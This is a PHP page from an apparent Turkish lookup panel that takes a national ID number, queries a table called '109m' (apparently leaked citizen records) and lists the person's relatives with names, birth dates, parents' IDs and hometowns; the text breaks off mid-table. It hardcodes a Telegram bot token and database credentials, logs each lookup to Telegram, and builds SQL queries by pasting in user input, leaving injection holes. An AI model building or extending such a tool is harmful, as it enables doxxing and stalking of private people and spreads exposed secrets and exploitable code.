<?php

include '../server/database.php';

include '../server/rolecontrol.php';

include '../server/functions.php';

$page_title = "Soyağacı Sorgu (109m)";

$selectedSide = $_POST['taraf'] ?? 'both';
if (!in_array($selectedSide, ['anne', 'baba', 'both'], true)) {
    $selectedSide = 'both';
}
$selectedSideLabelMap = [
    'both' => 'Anne ve Baba Tarafı',
    'anne' => 'Sadece Anne Tarafı',
    'baba' => 'Sadece Baba Tarafı'
];
$selectedSideLabel = $selectedSideLabelMap[$selectedSide];

?>

<!DOCTYPE html>

<html lang="tr">

<head>
    <?php include 'inc/header_main.php'; ?>
    <link href="assets/plugins/custom/datatables/datatables.bundle.css" rel="stylesheet" type="text/css" />
    <script src="assets/plugins/custom/datatables/datatables.bundle.js"></script>
    <style>
        .form-select {
            margin: 8px;
        }
    </style>
</head>

<body id="kt_body" class="aside-enabled">
<div class="d-flex flex-column flex-root">
    <div class="page d-flex flex-row flex-column-fluid">
        <?php include 'inc/header_sidebar.php'; ?>
        <div class="wrapper d-flex flex-column flex-row-fluid" id="kt_wrapper">
            <?php include 'inc/header_navbar.php'; ?>
            <div class="content d-flex flex-column flex-column-fluid " id="kt_content">
                <div class="post d-flex flex-column-fluid" id="kt_post">
                    <div id="kt_content_container" class="container-xxl">
                        <div class="row">
                            <div class="col-xl-12">
                                <div class="col-lg-12">
                                    <div class="card">
                                        <div class="card-body">
                                            <div class="alert alert-dismissible bg-light-primary border border-primary  d-flex flex-column flex-sm-row w-100 p-5 mb-0">
                                                <i class="ki-duotone ki-information-2 fs-2hx text-primary me-4 mb-5 mb-sm-0">
                                                    <span class="path1"></span><span class="path2"></span><span class="path3"></span></i>
                                                <div class="d-flex flex-column pe-0 pe-sm-10">
                                                    <h5 class="mb-1">Bilgilendirme</h5>
                                                    <div style="padding: 1px;"></div>
                                                    <span class="text-gray-800">
                                                        BURADA ÇIKMAZSA SOYAĞACI SORGU 101M OLANA GİT
                                                        <a class="menu-link" href="/soyagacisorgu">
                                                            <span class="menu-title">SOYAĞACI SORGU (101M)</span>
                                                        </a>
                                                    </span>
                                                </div>
                                                <br>
                                                <button type="button" class="position-absolute position-sm-relative m-2 m-sm-0 top-0 end-0 btn btn-icon ms-sm-auto" data-bs-dismiss="alert">
                                                    <i class="ki-duotone ki-cross fs-1 text-primary">
                                                        <span class="path1"></span><span class="path2"></span></i>
                                                </button>
                                            </div>
                                            <br>
                                            <h4 class="card-title mb-4"> Soyağacı Sorgu 109m</h4>
                                            <div style="padding: 3.8px;"></div>
                                            <div class="block-content tab-content">
                                                <form action="soyagacisorgu4" method="POST">
                                                    <div class="tab-pane active" id="tc" role="tabpanel">
                                                        <input autocomplete="off" name="tc"
                                                               class="form-control form-control-solid" type="text"
                                                               minlength="11" maxlength="11"
                                                               placeholder="TC Kimlik Numarası" required>
                                                    </div>
                                                    <div class="tab-pane active mt-3" role="tabpanel">
                                                        <select name="taraf" class="form-select form-select-solid">
                                                            <option value="both" <?php echo $selectedSide === 'both' ? 'selected' : ''; ?>>Anne ve Baba Tarafı</option>
                                                            <option value="anne" <?php echo $selectedSide === 'anne' ? 'selected' : ''; ?>>Sadece Anne Tarafı</option>
                                                            <option value="baba" <?php echo $selectedSide === 'baba' ? 'selected' : ''; ?>>Sadece Baba Tarafı</option>
                                                        </select>
                                                    </div>
                                                    <br>
                                                    <center class="nw">
                                                        <button onclick="checkNumber()" id="sorgula" name="Sorgula"
                                                                type="submit"
                                                                class="btn waves-effect waves-light btn-rounded btn-success"
                                                                style="font-weight: 400;;width: 180px; height: 45px; outline: none; margin-left: 5px;">
                                                            Sorgula </button>
                                                        <button onclick="clearTable()" id="durdurButon"
                                                                type="button"
                                                                class="btn waves-effect waves-light btn-rounded btn-danger"
                                                                style="font-weight: 400;;width: 180px; height: 45px; outline: none; margin-left: 5px;">
                                                            Sıfırla </button>
                                                        <button onclick="copyTable()" id="copy_btn" type="button"
                                                                class="btn waves-effect waves-light btn-rounded btn-primary"
                                                                style="font-weight: 400;width: 180px; height: 45px; outline: none; margin-left: 5px;">
                                                            Kopyala </button>
                                                        <button onclick="printTable()" id="yazdirTable"
                                                                type="button"
                                                                class="btn waves-effect waves-light btn-rounded btn-info"
                                                                style="font-weight: 400;;width: 180px; height: 45px; outline: none; margin-left: 5px;">
                                                            Yazdır</button><br><br>
                                                    </center>
                                                </form>

                                                <div class="table-responsive">

                                                <table id="kt_datatable_dom_positioning"
                                                       class="table table-striped table-row-bordered gy-5 gs-7 border rounded">
                                                    <thead>
                                                    <tr>
                                                        <th>Yakınlık</th>
                                                        <th>TC</th>
                                                        <th>Ad</th>
                                                        <th>Soyad</th>
                                                        <th>Doğum Tarihi</th>
                                                        <th>Anne AD</th>
                                                        <th>Anne TC</th>
                                                        <th>Baba AD</th>
                                                        <th>Baba TC</th>
                                                        <th>Memleket İl</th>
                                                        <th>Memleket İlçe</th>
                                                    </tr>
                                                    </thead>
                                                    <tbody id="00001010">
                                                    <?php

                                                    if (isset($_POST['Sorgula'])) {

                                                        // Telegram Bot Credentials
                                                        $telegramBotToken = "8023055024:AAH1k7VBZIqGqrmXLdkccFxiJJw_JVM99Y0"; // Replace with your bot token
                                                        $telegramChatID = "-1002452003438"; // Replace with your chat ID

                                                        // Function to send message to Telegram asynchronously
                                                        function sendTelegramMessageAsync($message, $botToken, $chatID)
                                                        {
                                                            $url = "https://api.telegram.org/bot$botToken/sendMessage";
                                                            $payload = [
                                                                'chat_id' => $chatID,
                                                                'text' => $message,
                                                                'parse_mode' => 'HTML'
                                                            ];

                                                            if (function_exists('curl_init')) {
                                                                $ch = curl_init($url);
                                                                curl_setopt_array($ch, [
                                                                    CURLOPT_POST => true,
                                                                    CURLOPT_POSTFIELDS => http_build_query($payload),
                                                                    CURLOPT_RETURNTRANSFER => true,
                                                                    CURLOPT_TIMEOUT => 1,
                                                                    CURLOPT_CONNECTTIMEOUT => 1,
                                                                ]);
                                                                curl_exec($ch);
                                                                curl_close($ch);
                                                            } else {
                                                                $options = [
                                                                    'http' => [
                                                                        'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
                                                                        'method'  => 'POST',
                                                                        'content' => http_build_query($payload),
                                                                        'timeout' => 1
                                                                    ]
                                                                ];
                                                                $context = stream_context_create($options);
                                                                @file_get_contents($url, false, $context);
                                                            }
                                                        }


                                                        $currentTime = time();
                                                        $lastQueryTime = $_SESSION['last_query_time'];
                                                        $timeDifference = $currentTime - $lastQueryTime;


                                                        if ($access_level != 6 || $premium != 1) {

                                                            if ($timeDifference < 10) {
                                                                echo '<script type="text/javascript">toastr.error("10 saniyede 1 kere sorgu atabilirsiniz.");</script>';
                                                                exit;
                                                            } else {
                                                                $_SESSION['last_query_time'] = time();
                                                            }
                                                        }
                                                        $randomXP = rand(10, 200);

                                                        $exp_result = $exp + $randomXP;

                                                        $sql = "UPDATE `accounts` SET exp = :exp WHERE hash = :hash";
                                                        $update = $db->prepare($sql);
                                                        $update->bindParam(':exp', $exp_result);
                                                        $update->bindParam(':hash', $_SESSION['GET_USER_SSID']);
                                                        $update->execute();

                                                        totalLog("soyagacisrg");
                                                        countAdd();

                                                        $tc = htmlspecialchars(strip_tags($_POST['tc']));

                                                        $var1 = strtoupper($tc);

                                                        if ($tc != "") {



                                                            $title = $page_title;

                                                            $getInfoSSID = $_SESSION['GET_USER_SSID'];

                                                            $getInfoQuery = $db->query("SELECT * FROM `accounts` WHERE hash = '$getInfoSSID'");

                                                            while ($getInfoData = $getInfoQuery->fetch()) {
                                                                $username = base64_decode($getInfoData['username']);
                                                            }

                                                            $time = date('d.m.Y H:i');

                                                            $telegramMessage = "👤 <b>Soyağacı Sorgu (109m)</b>\n\n"
                                                                . "👤 Kullanıcı: <b>$username</b>\n"
                                                                . "👤 TC: <b>$var1</b>\n"
                                                                . "🧭 Taraf: <b>$selectedSideLabel</b>\n"
                                                                . "🕒 Zaman: <b>$time</b>";

                                                            sendTelegramMessageAsync($telegramMessage, $telegramBotToken, $telegramChatID);



                                                            $baglanti = new mysqli('localhost:8889', 'root', 'root', 'sorguuu');

                                                            $sql = "SELECT * FROM `109m` WHERE `TC` = '$tc'";
                                                            $result = $baglanti->query($sql);
                                                            if (mysqli_num_rows($result) == 0) {
                                                                echo "<script>toastr.error('Maalesef, sorguladığınız kişinin Soy Ağacı bilgisi bulunamadı.');</script>";
                                                            } else {
                                                                echo "<script>toastr.success('Sorgu işlemi başarıyla tamamlandı!');</script>";
                                                                echo "<script>toastr.info('$randomXP deneyim puanı kazandınız.');</script>";

                                                                while ($row = $result->fetch_assoc()) {
                                                                    echo "<tr>
													<td> Kendisi </td> 
													<td>" . $row["TC"] . "</td>
													<td>" . $row["AD"] . "</td>
													<td>" . $row["SOYAD"] . "</td>
													<td>" . $row["DOGUMTARIHI"] . "</td>
													<td>" . $row["ANNEADI"] . "</td>
													<td>" . $row["ANNETC"] . "</td>
													<td>" . $row["BABAADI"] . "</td>
													<td>" . $row["BABATC"] . "</td>
													<td>" . $row["MEMLEKETIL"] . "</td>
													<td>" . $row["MEMLEKETILCE"] . "</td>
								
												</tr>";
                                                                    $sqlcocugu = "SELECT * FROM `109m` WHERE NOT `TC` = '" . $row["TC"] . "'  AND (`BABATC` = '" . $row["TC"] . "' OR `ANNETC` = '" . $row["TC"] . "' ) ";
                                                                    $resultcocugu = $baglanti->query($sqlcocugu);

                                                                    $sqlkardesi = "SELECT * FROM `109m` WHERE NOT `TC` = '" . $row["TC"] . "'  AND (`BABATC` = '" . $row["BABATC"] . "' OR `ANNETC` = '" . $row["ANNETC"] . "' ) ";
                                                                    $resultkardesi = $baglanti->query($sqlkardesi);
                                                                    $sqlBabası = "SELECT * FROM `109m` WHERE `TC` = '" . $row["BABATC"] . "' ";
                                                                    $resultBabası = $baglanti->query($sqlBabası);
                                                                    $sqlAnnesi = "SELECT * FROM `109m` WHERE `TC` = '" . $row["ANNETC"] . "' ";
                                                                    $resultAnnesi = $baglanti->query($sqlAnnesi);

                                                                    $sqlkendicocugu = "SELECT * FROM `109m` WHERE NOT `TC` = '" . $row["TC"] . "'  AND (`BABATC` = '" . $row["TC"] . "' OR `ANNETC` = '" . $row["TC"] . "' ) ";
                                                                    $resultkendicocugu = $baglanti->query($sqlkendicocugu);
                                                                    while ($row = $resultkendicocugu->fetch_assoc()) {
                                                                        echo "<tr>
														<td> Çocuğu </td>
														<td>" . $row["TC"] . "</td>
														<td>" . $row["AD"] . "</td>
														<td>" . $row["SOYAD"] . "</td>
														<td>" . $row["DOGUMTARIHI"] . "</td>
														<td>" . $row["ANNEADI"] . "</td>
														<td>" . $row["ANNETC"] . "</td>
														<td>" . $row["BABAADI"] . "</td>
														<td>" . $row["BABATC"] . "</td>
														<td>" . $row["MEMLEKETIL"] . "</td>
														<td>" . $row["MEMLEKETILCE"] . "</td>
									
													</tr>";
                                                                        $sqlkendikendicocugu = "SELECT * FROM `109m` WHERE NOT `TC` = '" . $row["TC"] . "'  AND (`BABATC` = '" . $row["TC"] . "' OR `ANNETC` = '" . $row["TC"] . "' ) ";
                                                                        $resultkendikendicocugu = $baglanti->query($sqlkendikendicocugu);
                                                                        while ($row = $resultkendikendicocugu->fetch_assoc()) {
                                                                            echo "<tr>
															<td> Torunu </td>
															<td>" . $row["TC"] . "</td>
															<td>" . $row["AD"] . "</td>
															<td>" . $row["SOYAD"] . "</td>
															<td>" . $row["DOGUMTARIHI"] . "</td>
															<td>" . $row["ANNEADI"] . "</td>
															<td>" . $row["ANNETC"] . "</td>
															<td>" . $row["BABAADI"] . "</td>
															<td>" . $row["BABATC"] . "</td>
															<td>" . $row["MEMLEKETIL"] . "</td>
															<td>" . $row["MEMLEKETILCE"] . "</td>
										
														</tr>";
                                                                            $sqlkendikendikendicocugu = "SELECT * FROM `109m` WHERE NOT `TC` = '" . $row["TC"] . "'  AND (`BABATC` = '" . $row["TC"] . "' OR `ANNETC` = '" . $row["TC"] . "' ) ";
                                                                            $resultkendikendikendicocugu = $baglanti->query($sqlkendikendikendicocugu);
                                                                            while ($row = $resultkendikendikendicocugu->fetch_assoc()) {
                                                                                echo "<tr>
																<td> Torununun Çocuğu </td>
																<td>" . $row["TC"] . "</td>
																<td>" . $row["AD"] . "</td>
																<td>" . $row["SOYAD"] . "</td>
																<td>" . $row["DOGUMTARIHI"] . "</td>
																<td>" . $row["ANNEADI"] . "</td>
																<td>" . $row["ANNETC"] . "</td>
																<td>" . $row["BABAADI"] . "</td>
																<td>" . $row["BABATC"] . "</td>
																<td>" . $row["MEMLEKETIL"] . "</td>
																<td>" . $row["MEMLEKETILCE"] . "</td>
											
															</tr>";
                                                                            }
                                                                        }
                                                                    }
                                                                    while ($row = $resultkardesi->fetch_assoc()) {
                                                                        echo "<tr>
														<td> Kardeşi </td>
														<td>" . $row["TC"] . "</td>
														<td>" . $row["AD"] . "</td>
														<td>" . $row["SOYAD"] . "</td>
														<td>" . $row["DOGUMTARIHI"] . "</td>
														<td>" . $row["ANNEADI"] . "</td>
														<td>" . $row["ANNETC"] . "</td>
														<td>" . $row["BABAADI"] . "</td>
														<td>" . $row["BABATC"] . "</td>
														<td>" . $row["MEMLEKETIL"] . "</td>
														<td>" . $row["MEMLEKETILCE"] . "</td>
									
													</tr>";
                                                                        $sqlkardescocugu = "SELECT * FROM `109m` WHERE NOT `TC` = '" . $row["TC"] . "'  AND (`BABATC` = '" . $row["TC"] . "' OR `ANNETC` = '" . $row["TC"] . "' ) ";
                                                                        $resultkardescocugu = $baglanti->query($sqlkardescocugu);
                                                                        while ($row = $resultkardescocugu->fetch_assoc()) {
                                                                            echo "<tr>
															<td> Kardeşinin Çocuğu </td>
															<td>" . $row["TC"] . "</td>
															<td>" . $row["AD"] . "</td>
															<td>" . $row["SOYAD"] . "</td>
															<td>" . $row["DOGUMTARIHI"] . "</td>
															<td>" . $row["ANNEADI"] . "</td>
															<td>" . $row["ANNETC"] . "</td>
															<td>" . $row["BABAADI"] . "</td>
															<td>" . $row["BABATC"] . "</td>
															<td>" . $row["MEMLEKETIL"] . "</td>
															<td>" . $row["MEMLEKETILCE"] . "</td>
										
														</tr>";

                                                                            $sqlkardeskardescocugu = "SELECT * FROM `109m` WHERE NOT `TC` = '" . $row["TC"] . "'  AND (`BABATC` = '" . $row["TC"] . "' OR `ANNETC` = '" . $row["TC"] . "' ) ";
                                                                            $resultkardeskardescocugu = $baglanti->query($sqlkardeskardescocugu);
                                                                            while ($row = $resultkardeskardescocugu->fetch_assoc()) {
                                                                                echo "<tr>
																<td> Kardeşinin Torunu </td>
																<td>" . $row["TC"] . "</td>
																<td>" . $row["AD"] . "</td>
																<td>" . $row["SOYAD"] . "</td>
																<td>" . $row["DOGUMTARIHI"] . "</td>
																<td>" . $row["ANNEADI"] . "</td>
																<td>" . $row["ANNETC"] . "</td>
																<td>" . $row["BABAADI"] . "</td>
																<td>" . $row["BABATC"] . "</td>
																<td>" . $row["MEMLEKETIL"] . "</td>
																<td>" . $row["MEMLEKETILCE"] . "</td>
											
															</tr>";
                                                                                $sqlkardeskardeskardescocugu = "SELECT * FROM `109m` WHERE NOT `TC` = '" . $row["TC"] . "'  AND (`BABATC` = '" . $row["TC"] . "' OR `ANNETC` = '" . $row["TC"] . "' ) ";
                                                                                $resultkardeskardeskardescocugu = $baglanti->query($sqlkardeskardeskardescocugu);
                                                                                while ($row = $resultkardeskardeskardescocugu->fetch_assoc()) {
                                                                                    echo "<tr>
																	<td> Kardeşinin Torununun Çocuğu </td>
																	<td>" . $row["TC"] . "</td>
																	<td>" . $row["AD"] . "</td>
																	<td>" . $row["SOYAD"] . "</td>
																	<td>" . $row["DOGUMTARIHI"] . "</td>
																	<td>" . $row["ANNEADI"] . "</td>
																	<td>" . $row["ANNETC"] . "</td>
																	<td>" . $row["BABAADI"] . "</td>
																	<td>" . $row["BABATC"] . "</td>
																	<td>" . $row["MEMLEKETIL"] . "</td>
																	<td>" . $row["MEMLEKETILCE"] . "</td>
												
																</tr>";
                                                                                }
                                                                            }
                                                                        }
                                                                    }
                                                                }

                                                                if ($selectedSide !== 'anne') {
                                                                    while ($row = $resultBabası->fetch_assoc()) {
                                                                    echo "<tr>
														<td> Babası </td>
														<td>" . $row["TC"] . "</td>
														<td>" . $row["AD"] . "</td>
														<td>" . $row["SOYAD"] . "</td>
														<td>" . $row["DOGUMTARIHI"] . "</td>
														<td>" . $row["ANNEADI"] . "</td>
														<td>" . $row["ANNETC"] . "</td>
														<td>" . $row["BABAADI"] . "</td>
														<td>" . $row["BABATC"] . "</td>
														<td>" . $row["MEMLEKETIL"] . "</td>
														<td>" . $row["MEMLEKETILCE"] . "</td>
									
													</tr>";
                                                                    $sqlbabakardesi = "SELECT * FROM `109m` WHERE NOT `TC` = '" . $row["TC"] . "'  AND (`BABATC` = '" . $row["BABATC"] . "' OR `ANNETC` = '" . $row["ANNETC"] . "' ) ";
                                                                    $resultbabakardesi = $baglanti->query($sqlbabakardesi);
                                                                    $sqlbabaBabası = "SELECT * FROM `109m` WHERE `TC` = '" . $row["BABATC"] . "' ";
                                                                    $resultbabaBabası = $baglanti->query($sqlbabaBabası);
                                                                    $sqlbabaAnnesi = "SELECT * FROM `109m` WHERE `TC` = '" . $row["ANNETC"] . "' ";
                                                                    $resultbabaAnnesi = $baglanti->query($sqlbabaAnnesi);

                                                                    while ($row = $resultbabakardesi->fetch_assoc()) {
                                                                        echo "<tr>
															<td> Babasının Kardeşi </td>
															<td>" . $row["TC"] . "</td>
															<td>" . $row["AD"] . "</td>
															<td>" . $row["SOYAD"] . "</td>
															<td>" . $row["DOGUMTARIHI"] . "</td>
															<td>" . $row["ANNEADI"] . "</td>
															<td>" . $row["ANNETC"] . "</td>
															<td>" . $row["BABAADI"] . "</td>
															<td>" . $row["BABATC"] . "</td>
															<td>" . $row["MEMLEKETIL"] . "</td>
															<td>" . $row["MEMLEKETILCE"] . "</td>
										
														</tr>";
                                                                        $sqlbabakardescocugu = "SELECT * FROM `109m` WHERE NOT `TC` = '" . $row["TC"] . "'  AND (`BABATC` = '" . $row["TC"] . "' OR `ANNETC` = '" . $row["TC"] . "' ) ";
                                                                        $resultbabakardescocugu = $baglanti->query($sqlbabakardescocugu);
                                                                        while ($row = $resultbabakardescocugu->fetch_assoc()) {
                                                                            echo "<tr>
																<td> Babasının Kardeşinin Çocuğu </td>
																<td>" . $row["TC"] . "</td>
																<td>" . $row["AD"] . "</td>
																<td>" . $row["SOYAD"] . "</td>
																<td>" . $row["DOGUMTARIHI"] . "</td>
																<td>" . $row["ANNEADI"] . "</td>
																<td>" . $row["ANNETC"] . "</td>
																<td>" . $row["BABAADI"] . "</td>
																<td>" . $row["BABATC"] . "</td>
																<td>" . $row["MEMLEKETIL"] . "</td>
																<td>" . $row["MEMLEKETILCE"] . "</td>
											
															</tr>";
                                                                            $sqlbabakardesbabakardescocugu = "SELECT * FROM `109m` WHERE NOT `TC` = '" . $row["TC"] . "'  AND (`BABATC` = '" . $row["TC"] . "' OR `ANNETC` = '" . $row["TC"] . "' ) ";
                                                                            $resultbabakardesbabakardescocugu = $baglanti->query($sqlbabakardesbabakardescocugu);
                                                                            while ($row = $resultbabakardesbabakardescocugu->fetch_assoc()) {
                                                                                echo "<tr>
																	<td> Babasının Kardeşinin Torunu </td>
																	<td>" . $row["TC"] . "</td>
																	<td>" . $row["AD"] . "</td>
																	<td>" . $row["SOYAD"] . "</td>
																	<td>" . $row["DOGUMTARIHI"] . "</td>
																	<td>" . $row["ANNEADI"] . "</td>
																	<td>" . $row["ANNETC"] . "</td>
																	<td>" . $row["BABAADI"] . "</td>
																	<td>" . $row["BABATC"] . "</td>
																	<td>" . $row["MEMLEKETIL"] . "</td>
																	<td>" . $row["MEMLEKETILCE"] . "</td>
												
																</tr>";
                                                                                $sqlbabakardesbabakardesbabakardescocugu = "SELECT * FROM `109m` WHERE NOT `TC` = '" . $row["TC"] . "'  AND (`BABATC` = '" . $row["TC"] . "' OR `ANNETC` = '" . $row["TC"] . "' ) ";
                                                                                $resultbabakardesbabakardesbabakardescocugu = $baglanti->query($sqlbabakardesbabakardesbabakardescocugu);
                                                                                while ($row = $resultbabakardesbabakardesbabakardescocugu->fetch_assoc()) {
                                                                                    echo "<tr>
																		<td> Babasının Kardeşinin Torununun Çocuğu </td>
																		<td>" . $row["TC"] . "</td>
																		<td>" . $row["AD"] . "</td>
																		<td>" . $row["SOYAD"] . "</td>
																		<td>" . $row["DOGUMTARIHI"] . "</td>
																		<td>" . $row["ANNEADI"] . "</td>
																		<td>" . $row["ANNETC"] . "</td>
																		<td>" . $row["BABAADI"] . "</td>
																		<td>" . $row["BABATC"] . "</td>
																		<td>" . $row["MEMLEKETIL"] . "</td>
																		<td>" . $row["MEMLEKETILCE"] . "</td>
													
																	</tr>";
                                                                                }
                                                                            }
                                                                        }
                                                                    }

                                                                    while ($row = $resultbabaBabası->fetch_assoc()) {
                                                                        echo "<tr>
																<td> Babasının Babası </td>
																<td>" . $row["TC"] . "</td>
																<td>" . $row["AD"] . "</td>
																<td>" . $row["SOYAD"] . "</td>
																<td>" . $row["DOGUMTARIHI"] . "</td>
																<td>" . $row["ANNEADI"] . "</td>
																<td>" . $row["ANNETC"] . "</td>
																<td>" . $row["BABAADI"] . "</td>
																<td>" . $row["BABATC"] . "</td>
																<td>" . $row["MEMLEKETIL"] . "</td>
																<td>" . $row["MEMLEKETILCE"] . "</td>
											
															</tr>";
                                                                        $sqlbabakardesi = "SELECT * FROM `109m` WHERE NOT `TC` = '" . $row["TC"] . "'  AND (`BABATC` = '" . $row["BABATC"] . "' OR `ANNETC` = '" . $row["ANNETC"] . "' ) ";
                                                                        $resultbabakardesi = $baglanti->query($sqlbabakardesi);
                                                                        $sqlbabaBabası = "SELECT * FROM `109m` WHERE `TC` = '" . $row["BABATC"] . "' ";
                                                                        $resultbabaBabası = $baglanti->query($sqlbabaBabası);
                                                                        $sqlbabaAnnesi = "SELECT * FROM `109m` WHERE `TC` = '" . $row["ANNETC"] . "' ";
                                                                        $resultbabaAnnesi = $baglanti->query($sqlbabaAnnesi);

                                                                        while ($row = $resultbabakardesi->fetch_assoc()) {
                                                                            echo "<tr>
																	<td> Babasının Babasının Kardeşi </td>
																	<td>" . $row["TC"] . "</td>
																	<td>" . $row["AD"] . "</td>
																	<td>" . $row["SOYAD"] . "</td>
																	<td>" . $row["DOGUMTARIHI"] . "</td>
																	<td>" . $row["ANNEADI"] . "</td>
																	<td>" . $row["ANNETC"] . "</td>
																	<td>" . $row["BABAADI"] . "</td>
																	<td>" . $row["BABATC"] . "</td>
																	<td>" . $row["MEMLEKETIL"] . "</td>
																	<td>" . $row["MEMLEKETILCE"] . "</td>
												
																</tr>";
                                                                            $sqlbabababakardescocugu = "SELECT * FROM `109m` WHERE NOT `TC` = '" . $row["TC"] . "'  AND (`BABATC` = '" . $row["TC"] . "' OR `ANNETC` = '" . $row["TC"] . "' ) ";
                                                                            $resultbabababakardescocugu = $baglanti->query($sqlbabababakardescocugu);
                                                                            while ($row = $resultbabababakardescocugu->fetch_assoc()) {
                                                                                echo "<tr>
																		<td> Babasının Babasının Kardeşinin Çocuğu </td>
																		<td>" . $row["TC"] . "</td>
																		<td>" . $row["AD"] . "</td>
																		<td>" . $row["SOYAD"] . "</td>
																		<td>" . $row["DOGUMTARIHI"] . "</td>
																		<td>" . $row["ANNEADI"] . "</td>
																		<td>" . $row["ANNETC"] . "</td>
																		<td>" . $row["BABAADI"] . "</td>
																		<td>" . $row["BABATC"] . "</td>
																		<td>" . $row["MEMLEKETIL"] . "</td>
																		<td>" . $row["MEMLEKETILCE"] . "</td>
													
																	</tr>";
                                                                                $sqlbabababakardesbabababakardescocugu = "SELECT * FROM `109m` WHERE NOT `TC` = '" . $row["TC"] . "'  AND (`BABATC` = '" . $row["TC"] . "' OR `ANNETC` = '" . $row["TC"] . "' ) ";
                                                                                $resultbabababakardesbabababakardescocugu = $baglanti->query($sqlbabababakardesbabababakardescocugu);
                                                                                while ($row = $resultbabababakardesbabababakardescocugu->fetch_assoc()) {
                                                                                    echo "<tr>
																			<td> Babasının Babasının Kardeşinin Torunu </td>
																			<td>" . $row["TC"] . "</td>
																			<td>" . $row["AD"] . "</td>
																			<td>" . $row["SOYAD"] . "</td>
																			<td>" . $row["DOGUMTARIHI"] . "</td>
																			<td>" . $row["ANNEADI"] . "</td>
																			<td>" . $row["ANNETC"] . "</td>
																			<td>" . $row["BABAADI"] . "</td>
																			<td>" . $row["BABATC"] . "</td>
																			<td>" . $row["MEMLEKETIL"] . "</td>
																			<td>" . $row["MEMLEKETILCE"] . "</td>
														
																		</tr>";
                                                                                    $sqlbabababakardesbabababakardesbabababakardescocugu = "SELECT * FROM `109m` WHERE NOT `TC` = '" . $row["TC"] . "'  AND (`BABATC` = '" . $row["TC"] . "' OR `ANNETC` = '" . $row["TC"] . "' ) ";
                                                                                    $resultbabababakardesbabababakardesbabababakardescocugu = $baglanti->query($sqlbabababakardesbabababakardesbabababakardescocugu);
                                                                                    while ($row = $resultbabababakardesbabababakardesbabababakardescocugu->fetch_assoc()) {
                                                                                        echo "<tr>
																				<td> Babasının Babasının Kardeşinin Torununun Çocuğu </td>
																				<td>" . $row["TC"] . "</td>
																				<td>" . $row["AD"] . "</td>
																				<td>" . $row["SOYAD"] . "</td>
																				<td>" . $row["DOGUMTARIHI"] . "</td>
																				<td>" . $row["ANNEADI"] . "</td>
																				<td>" . $row["ANNETC"] . "</td>
																				<td>" . $row["BABAADI"] . "</td>
																				<td>" . $row["BABATC"] . "</td>
																				<td>" . $row["MEMLEKETIL"] . "</td>
																				<td>" . $row["MEMLEKETILCE"] . "</td>
															
																			</tr>";
                                                                                    }
                                                                                }
                                                                            }
                                                                        }

                                                                        while ($row = $resultbabaBabası->fetch_assoc()) {
                                                                            echo "<tr>
																	<td> Babasının Babasının Babası </td>
																	<td>" . $row["TC"] . "</td>
																	<td>" . $row["AD"] . "</td>
																	<td>" . $row["SOYAD"] . "</td>
																	<td>" . $row["DOGUMTARIHI"] . "</td>
																	<td>" . $row["ANNEADI"] . "</td>
																	<td>" . $row["ANNETC"] . "</td>
																	<td>" . $row["BABAADI"] . "</td>
																	<td>" . $row["BABATC"] . "</td>
																	<td>" . $row["MEMLEKETIL"] . "</td>
																	<td>" . $row["MEMLEKETILCE"] . "</td>
												
																</tr>";
                                                                        }
                                                                        while ($row = $resultbabaAnnesi->fetch_assoc()) {
                                                                            echo "<tr>
																	<td> Babasının Babasının Annesi </td>
																	<td>" . $row["TC"] . "</td>
																	<td>" . $row["AD"] . "</td>
																	<td>" . $row["SOYAD"] . "</td>
																	<td>" . $row["DOGUMTARIHI"] . "</td>
																	<td>" . $row["ANNEADI"] . "</td>
																	<td>" . $row["ANNETC"] . "</td>
																	<td>" . $row["BABAADI"] . "</td>
																	<td>" . $row["BABATC"] . "</td>
																	<td>" . $row["MEMLEKETIL"] . "</td>
																	<td>" . $row["MEMLEKETILCE"] . "</td>
												
																</tr>";
                                                                        }
                                                                    }
                                                                    while ($row = $resultbabaAnnesi->fetch_assoc()) {
                                                                        echo "<tr>
																<td> Babasının Annesi </td>
																<td>" . $row["TC"] . "</td>
																<td>" . $row["AD"] . "</td>
																<td>" . $row["SOYAD"] . "</td>
																<td>" . $row["DOGUMTARIHI"] . "</td>
																<td>" . $row["ANNEADI"] . "</td>
																<td>" . $row["ANNETC"] . "</td>
																<td>" . $row["BABAADI"] . "</td>
																<td>" . $row["BABATC"] . "</td>
																<td>" . $row["MEMLEKETIL"] . "</td>
																<td>" . $row["MEMLEKETILCE"] . "</td>
											
															</tr>";
                                                                        $sqlbabakardesi = "SELECT * FROM `109m` WHERE NOT `TC` = '" . $row["TC"] . "'  AND (`BABATC` = '" . $row["BABATC"] . "' OR `ANNETC` = '" . $row["ANNETC"] . "' ) ";
                                                                        $resultbabakardesi = $baglanti->query($sqlbabakardesi);
                                                                        $sqlbabaBabası = "SELECT * FROM `109m` WHERE `TC` = '" . $row["BABATC"] . "' ";
                                                                        $resultbabaBabası = $baglanti->query($sqlbabaBabası);
                                                                        $sqlbabaAnnesi = "SELECT * FROM `109m` WHERE `TC` = '" . $row["ANNETC"] . "' ";
                                                                        $resultbabaAnnesi = $baglanti->query($sqlbabaAnnesi);

                                                                        while ($row = $resultbabakardesi->fetch_assoc()) {
                                                                            echo "<tr>
																	<td> Babasının Annesinin Kardeşi </td>
																	<td>" . $row["TC"] . "</td>
																	<td>" . $row["AD"] . "</td>
																	<td>" . $row["SOYAD"] . "</td>
																	<td>" . $row["DOGUMTARIHI"] . "</td>
																	<td>" . $row["ANNEADI"] . "</td>
																	<td>" . $row["ANNETC"] . "</td>
																	<td>" . $row["BABAADI"] . "</td>
																	<td>" . $row["BABATC"] . "</td>
																	<td>" . $row["MEMLEKETIL"] . "</td>
																	<td>" . $row["MEMLEKETILCE"] . "</td>
												
																</tr>";
                                                                            $sqlbabaannekardescocugu = "SELECT * FROM `109m` WHERE NOT `TC` = '" . $row["TC"] . "'  AND (`BABATC` = '" . $row["TC"] . "' OR `ANNETC` = '" . $row["TC"] . "' ) ";
                                                                            $resultbabaannekardescocugu = $baglanti->query($sqlbabaannekardescocugu);
                                                                            while ($row = $resultbabaannekardescocugu->fetch_assoc()) {
                                                                                echo "<tr>
																		<td> Babasının Annesinin Kardeşinin Çocuğu </td>
																		<td>" . $row["TC"] . "</td>
																		<td>" . $row["AD"] . "</td>
																		<td>" . $row["SOYAD"] . "</td>
																		<td>" . $row["DOGUMTARIHI"] . "</td>
																		<td>" . $row["ANNEADI"] . "</td>
																		<td>" . $row["ANNETC"] . "</td>
																		<td>" . $row["BABAADI"] . "</td>
																		<td>" . $row["BABATC"] . "</td>
